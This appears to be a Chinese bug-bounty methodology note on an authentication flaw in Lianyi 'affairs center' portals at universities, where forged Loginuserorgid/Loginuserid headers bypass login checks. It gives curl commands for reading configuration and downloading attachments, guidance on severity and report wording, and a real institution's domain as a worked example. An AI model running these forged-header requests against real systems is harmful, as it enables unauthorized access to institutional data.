# Lianyi/事务中心 systemSetting 请求头信任鉴权缺失模式

## 适用场景

高校 `ehall.*.edu.cn`、事务中心、办事大厅、服务中心等系统，前端 JS 中出现以下特征：

- `/api/authc/systemSetting/`
- `/api/docrepo/download`
- `/api/swzx_wz/`
- 页面/响应中出现“事务中心”、`LIANYI TECHNOLOGY`、`连一`、`systemSetting` 等线索
- 接口报错提示缺少 `Loginuserorgid`、`Loginuserid` 等请求头

该模式不同于金智教育 `/jsonp/*` 未授权 API。它的根因通常是后端接口只检查客户端可控身份头是否存在，而没有校验真实登录态。

## 低影响验证流程

### 1. 对照：无身份头请求

```bash
curl -sk -D- 'https://ehall.TARGET.edu.cn/api/authc/systemSetting/?pageSize=10&pageNum=1'
```

若返回类似：

```json
{"status":400,"message":"Missing request header 'Loginuserorgid' for method parameter of type String"}
```

说明接口依赖请求头身份上下文。

### 2. 伪造任意身份头请求

```bash
curl -sk -D- 'https://ehall.TARGET.edu.cn/api/authc/systemSetting/?pageSize=10&pageNum=1' -H 'Loginuserorgid: -1' -H 'Loginuserid: -1' -H 'Accept: application/json'
```

若返回 `meta.success=true`、`data.list`、`systemName`、`versionNum`、`defaultImgItemId`、`logoItemId` 等配置，则可确认 systemSetting 配置接口存在鉴权缺失。

### 3. 详情接口

从列表中取 `id`，例如 `ly-gtc`：

```bash
curl -sk -D- 'https://ehall.TARGET.edu.cn/api/authc/systemSetting/ly-gtc' -H 'Loginuserorgid: -1' -H 'Loginuserid: -1' -H 'Accept: application/json'
```

重点观察：

- `defaultImgAttachment.id`
- `loginImgAttachments[].id`
- `logoAttachment.id`
- `name` / `suffix` / `url` 存储路径

### 4. 附件下载验证

用上一步返回的真实 attachmentId 验证下载：

```bash
curl -sk -D- 'https://ehall.TARGET.edu.cn/api/docrepo/download?attachmentId=ATTACHMENT_ID' -H 'Loginuserorgid: -1' -H 'Loginuserid: -1' -o /tmp/ehall_attachment.bin
file /tmp/ehall_attachment.bin
```

若返回 `HTTP/1.1 200` 且文件可识别，证明配置泄露可进一步利用到对象下载。

## 误报过滤和边界

必须做反向验证，避免夸大：

```bash
curl -sk -D- 'https://ehall.TARGET.edu.cn/api/authc/service?pageSize=10&pageNum=1' -H 'Loginuserorgid: -1' -H 'Loginuserid: -1'
```

如果其它业务接口返回 `302` 到登录页、`UnknownSessionException` 或 `401/403`，报告只能写 systemSetting 配置接口鉴权缺失，不能写全站认证绕过。

不要将以下内容夸大为高危：

- 只读取到系统名称、版本、logo 附件、存储路径
- 只下载到公开 logo/背景图
- 未证明可读取学生/教职工 PII、流程数据、业务申请数据、待办数据或写操作

## 定级建议

- 仅 systemSetting 配置 + logo 类附件：中低危/中危边界，可能被平台降级或忽略。
- 同一请求头信任逻辑可读取业务数据、人员信息、流程统计、待办或敏感附件：中危到高危，按未授权敏感数据访问提交。
- 能执行写操作、修改配置、上传/删除附件：高危，按认证绕过/权限控制缺失提交。

## 报告措辞

推荐标题：

`XXX学校事务中心systemSetting接口鉴权缺失导致系统配置未授权访问`

报告中必须明确：

1. 无头请求返回缺少 `Loginuserorgid` 的对照证据。
2. 伪造任意 `Loginuserorgid/Loginuserid` 后返回 200 的证据。
3. 详情接口返回附件对象 ID / 存储路径的证据。
4. `docrepo/download?attachmentId=` 可下载附件的证据。
5. 其它业务接口仍需登录的反向验证，避免过报。

## 实战样例

成都职业技术学院 `ehall.cdp.edu.cn`：

- `/api/authc/systemSetting/?pageSize=10&pageNum=1` 无身份头返回缺少 `Loginuserorgid`
- 伪造 `Loginuserorgid: -1`、`Loginuserid: -1` 返回事务中心配置列表
- `/api/authc/systemSetting/ly-gtc` 返回 logo 附件对象 ID 与 FastDFS 风格存储路径
- `/api/docrepo/download?attachmentId=<id>` 可下载 PNG logo
- `/api/authc/service` 等业务接口仍 302 到登录页，因此只能按配置接口鉴权缺失保守提交
